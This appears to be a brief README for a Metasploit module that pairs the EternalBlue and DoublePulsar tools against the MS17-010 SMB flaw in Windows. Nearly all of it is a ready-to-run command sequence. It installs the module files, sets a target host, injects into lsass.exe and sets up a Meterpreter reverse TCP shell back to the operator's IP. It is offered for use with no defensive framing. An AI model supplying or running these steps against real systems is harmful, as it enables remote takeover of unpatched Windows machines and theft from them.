# Eternalblue-Doublepulsar-Metasploit

cd Eternalblue-Doublepulsar-Metasploit
mv deps eternalblue_doublepulsar.rb /opt/metasploit/modules/exploits/windows/smb/

#in msf

use auxiliary/scanner/smb/smb_ms17_010 
set DOUBLEPULSARPATH /opt/metasploit/modules/exploits/windows/smb/deps/
set ETERNALBLUEPATH /opt/metasploit/modules/exploits/windows/smb/deps/
set RHOST target_ip


set PROCESSINJECT x
EXAMPLE X = lsass.exe
set TARGETARCHITECTURE x64

set WINEPATH /home/user/.wine/drive_c/
set target X

set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP

#exploit
